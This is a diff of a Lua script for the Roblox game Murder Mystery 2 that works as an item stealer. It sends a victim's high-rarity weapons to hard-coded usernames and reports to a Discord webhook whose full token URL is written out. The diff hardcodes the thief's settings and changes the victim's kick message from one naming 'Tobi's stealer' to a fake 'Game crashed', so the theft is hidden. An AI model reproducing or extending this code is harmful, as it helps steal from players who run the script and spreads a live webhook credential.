@@ -1,19 +1,9 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
 
-local users = _G.Usernames or {"ally4ofc"}
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
-
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add username or webhook")
-    return
-end
+local users = {ally4ofc}
+local min_rarity = "Godly"
+local min_value = 1
+local ping = "No"
+local webhook = "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
 
 if game.PlaceId ~= 142823291 then
     plr:kick("Game not supported. Please join a normal MM2 server")
@@ -480,7 +470,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Game crashed")
     end
 
     local function waitForUserChat()
